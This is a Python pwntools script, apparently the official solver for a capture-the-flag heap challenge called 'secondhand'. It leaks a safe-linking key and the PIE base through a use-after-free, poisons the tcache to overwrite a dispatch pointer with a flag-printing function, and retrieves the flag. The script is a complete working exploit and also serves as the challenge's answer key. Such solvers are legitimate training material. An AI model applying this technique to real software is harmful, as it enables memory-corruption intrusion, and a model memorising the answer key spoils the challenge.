#!/usr/bin/env python3
"""Official remote solver for secondhand."""

from __future__ import annotations

import argparse
import re
from pathlib import Path

from pwn import ELF, context, log, remote


HERE = Path(__file__).resolve().parent
BINARY = HERE / "secondhand"
DEBUG_BINARY = HERE / "secondhand.debug"

context.binary = ELF(str(BINARY), checksec=False)
symbols = ELF(str(DEBUG_BINARY), checksec=False)
context.arch = "amd64"
context.log_level = "error"


def choose(io, choice: int) -> None:
    io.sendlineafter(b"> ", str(choice).encode())


def consign(io, label: int, price: int) -> None:
    choose(io, 1)
    io.sendlineafter(b"label (hex)> ", f"{label:x}".encode())
    io.sendlineafter(b"price> ", str(price).encode())


def sell(io, index: int) -> None:
    choose(io, 4)
    io.sendlineafter(b"index> ", str(index).encode())


def relabel(io, index: int, label: int) -> None:
    choose(io, 3)
    io.sendlineafter(b"index> ", str(index).encode())
    io.sendlineafter(b"new label (hex)> ", f"{label:x}".encode())


def preview_leaks(io, index: int) -> tuple[int, int]:
    choose(io, 2)
    io.sendlineafter(b"index> ", str(index).encode())
    io.recvuntil(b"storage word: ")
    storage_word = int(io.recvline().strip(), 16)
    io.recvuntil(b"preview callback: ")
    callback = int(io.recvline().strip(), 16)
    return storage_word, callback


def exploit(io) -> bytes:
    # A and B are the only two fresh chunks.  Freeing B into an empty tcache
    # exposes PROTECT_PTR(&B->next, NULL) == address(B) >> 12.
    consign(io, 0x4141414141414141, 100)  # slot 0: A
    consign(io, 0x4242424242424242, 200)  # slot 1: B
    sell(io, 1)
    heap_key, callback_leak = preview_leaks(io, 1)

    symbols.address = callback_leak - symbols.sym["render_item"]
    target = symbols.sym["checkout_dispatch"]
    win = symbols.sym["print_flag"]
    if target & 0xF:
        raise RuntimeError("checkout_dispatch lost its required 16-byte alignment")

    log.info("safe-linking key = %#x", heap_key)
    log.info("PIE base         = %#x", symbols.address)

    # Reclaim the exact B chunk whose key was leaked, then free A followed by
    # B.  B is now the head of a two-entry tcache list, so no page-layout guess
    # is needed for PROTECT_PTR.
    consign(io, 0x4343434343434343, 300)  # slot 2: reclaimed B
    sell(io, 0)                            # tcache: A
    sell(io, 2)                            # tcache: B -> A

    encoded_target = target ^ heap_key
    relabel(io, 2, encoded_target)         # tcache: B -> dispatch
    consign(io, 0x4444444444444444, 400)  # returns B
    consign(io, win, 500)                  # returns checkout_dispatch

    choose(io, 5)
    output = io.recvall(timeout=3)
    match = re.search(rb"(?:kctf\{flag\}|KCTF\{[0-9a-f]{64}\})", output)
    if match is None:
        raise RuntimeError(f"flag not found in service output: {output!r}")
    return match.group(0)


def main() -> None:
    parser = argparse.ArgumentParser(description="official secondhand solver")
    parser.add_argument("host")
    parser.add_argument("port", type=int)
    arguments = parser.parse_args()

    io = remote(arguments.host, arguments.port)
    flag = exploit(io)
    print(flag.decode())


if __name__ == "__main__":
    main()
